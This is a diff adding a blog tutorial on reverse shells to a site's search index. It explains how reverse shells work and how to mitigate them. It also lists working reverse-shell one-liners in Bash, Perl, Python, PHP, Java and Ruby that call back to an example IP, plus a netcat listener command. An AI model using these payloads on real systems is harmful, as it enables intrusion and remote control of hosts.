@@ -987,5 +987,63 @@ Do not use the knowledge for illegal things.</em></p>
       </tags>
   </entry>
 
- 
+   <entry>
+    <title>What Are Reverse Shells?</title>
+    <url>/2023/01/23/What-Are-Reverse-Shells/</url>
+   <content><![CDATA[<p>Be yourself use your brain<br><a id="more"></a></p>  
+<h2 id="Preface">
+<a href="#Preface" class="headerlink" title="Preface">
+</a>[Preface]</h2>
+<p>A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the attacker’s host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. Reverse shells can also work across a NAT or firewall. 
+This article explains how reverse shells work in practice and what you can do to prevent them.</p>
+<center><p><img src="../../../../images/What-Are-Reverse-Shells/1.PNG" alt="What-Are-Reverse-Shells" /></p></center>
+<h2 id="Getting">
+<a href="#Getting" class="headerlink" title="Getting"></a>[Getting Started]</h2>
+<p>A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the local host. Attackers who successfully exploit a <a href="/" rel="noreferrer">remote command execution vulnerability</a> can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. A reverse shell (also called a connect-back shell) can also be the only way to gain remote shell access across a NAT or firewall. Let’s see how reverse shells work in practice and what you can do to prevent them.</p>
+<center><p><img src="../../../../images/What-Are-Reverse-Shells/2.PNG" alt="What-Are-Reverse-Shells" /></p></center>
+<h2>How a Reverse Shell Works</h2>
+<p>To establish a typical remote shell, a machine controlled by the attacker connects to a remote network host and requests a shell session – this is called a bind shell. But what if the remote host is not directly accessible, for example because it has no public IP or is protected by a firewall? In this situation, a reverse shell might be used, where the target machine initiates an outgoing connection to a listening network host and a shell session is established.</p>
+<p>Reverse shells are often the only way to perform remote maintenance on hosts behind a NAT, so they have legitimate administrative uses. However, they can also be used by cybercriminals to execute operating system commands on hosts protected from incoming connections by a firewall or other network security systems. For example, a piece of malware installed on a local workstation via a phishing email or a malicious website might initiate an outgoing connection to a command server and provide hackers with a reverse shell capability. Firewalls mostly filter incoming traffic, so an outgoing connection to a listening server will often succeed.</p>
+<p>When attempting to compromise a server, an attacker may try to exploit a command injection vulnerability on the server system. The injected code will often be a reverse shell script to provide a convenient command shell for further malicious activities.</p>
+<h2>Reverse Shell Code Examples</h2>
+<p>To start with, the attacker needs to start a listener process on their system to listen for reverse shell connections incoming to their IP address, for example 10.0.0.123. On Linux, this can be as simple as one netcat command:</p>
+<pre class="wp-block-code"><code>ncat -l -p 1111</code></pre>
+<p>This will start a netcat listener on port 1111. Now the attacker needs to (manually or automatically) execute code on the remote machine to connect to the listener. Many ready reverse shell codes exist for various systems and languages – see <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noreferrer">pentestmonkey’s Reverse Shell Cheat Sheet</a> for an extensive list. Kali Linux also comes with a <a href="https://tools.kali.org/maintaining-access/webshells" rel="noreferrer">set of ready webshells</a>, including reverse shells. Codes are typically one-liners to allow injection using a single command. While the examples below are for Linux and other Unix-like systems, many of them will also work on Windows if you change the command line interpreter call from /bin/sh -i to cmd.exe.</p>
+<h3>Bash Reverse Shell</h3>
+<p>If the target machine runs Linux, it’s a good idea to start with bash, as nearly all Linux systems come with this system shell:</p>
+<pre class="wp-block-code"><code>/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.123/1111 0&gt;&amp;1</code></pre>
+<h3>Perl Reverse Shell</h3>
+<p>As with bash, a perl interpreter should be available on most Linux servers, so a perl command might be another way to obtain a reverse shell:</p>
+<pre class="wp-block-code"><code>perl -e 'use Socket;$i="10.0.0.123";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre>
+<h3>Python Reverse Shell</h3>
+<p>With <a href="https://octoverse.github.com/#top-languages" rel="noreferrer">Python continuing to gain popularity</a>, there’s a good chance it’s available on the target server and can be used to execute a script like:</p>
+<pre class="wp-block-code"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.123",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(&#091;"/bin/sh","-i"]);'</code></pre>
+<h3>PHP Reverse Shell</h3>
+<p>Most web servers will have PHP installed, and this too can provide a reverse shell vector (if the file descriptor &amp;3 doesn’t work, you can try subsequent numbers):</p>
+<pre class="wp-block-code"><code>php -r '$sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
+<h3>Java Reverse Shell</h3>
+<p>Java is likely to be available on application servers:</p>
+<pre class="wp-block-code"><code>r = Runtime.getRuntime()<br>p = r.exec(&#091;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.123/1111;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String&#091;])<br>p.waitFor()</code></pre>
+<h3>Ruby Reverse Shell</h3>
+<p>Ruby is another popular web application language that’s likely to have an interpreter on a general-purpose server system:</p>
+<pre class="wp-block-code"><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.123",1111).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</code></pre>
+<h2>Preventing Reverse Shells</h2>
+<p>Unless you are deliberately using reverse shells for remote administration, any reverse shell connections are likely to be malicious. Unfortunately, there’s also no surefire way of blocking reverse shell connections on a networked system, especially a server. You can mitigate the risk by selectively hardening your system:</p>
+<ul><li>To limit exploitation, you can lock down outgoing connectivity to allow only specific remote IP addresses and ports for the required services. This might be achieved by sandboxing or running the server in a minimal container. Another way could be to set up a proxy server with tightly controlled destination restrictions. However, considering that reverse shells can be created even over DNS, such hardening can only limit the risk of reverse shell connections, not eliminate it.&nbsp;</li><li>To make attacks a little more difficult, you can remove all unnecessary tools and interpreters to prevent the execution of at least some reverse shell codes. However, this is usually not a practical option except for the most hardened and specialized servers, and a determined attacker will eventually find a working shell script anyway.</li></ul>
+<p>Regardless of the technicalities, once an attacker has a way of executing OS commands, the system should be considered compromised – so the best protection from reverse shells is to prevent exploitation in the first place. Shell scripts are typically executed by exploiting a <a href="/" rel="noreferrer">code injection vulnerability</a>, often followed by <a href="/" rel="noreferrer">privilege escalation</a> to obtain root privileges. To avoid <a href="/" rel="noreferrer">these and other vulnerabilities</a>, it’s vital to regularly patch your servers and web applications, and test them using a <a href="/" rel="noreferrer">proven vulnerability scanner</a>.</p>
+<h2 id="DISCLAIMER">
+<a href="#DISCLAIMER" class="headerlink" title="DISCLAIMER"></a>[DISCLAIMER]</h2>
+<p><em>Anything u learned from the Blog just for research and educational purposes only
+Do not use the knowledge for illegal things.</em></p>
+<br>Sorry about my english, is so bad😅</a>
+<br>If you have any questions or suggestions, make sure to hit me in any of these mediums or the comments.      </a>
+<br>Thanks for reading.</a>]]></content>
+      <categories>
+        <category>WebSecurity</category>
+      </categories>
+      <tags>
+        <tag>WebSecurity</tag>
+      </tags>
+  </entry>
+
 </search>
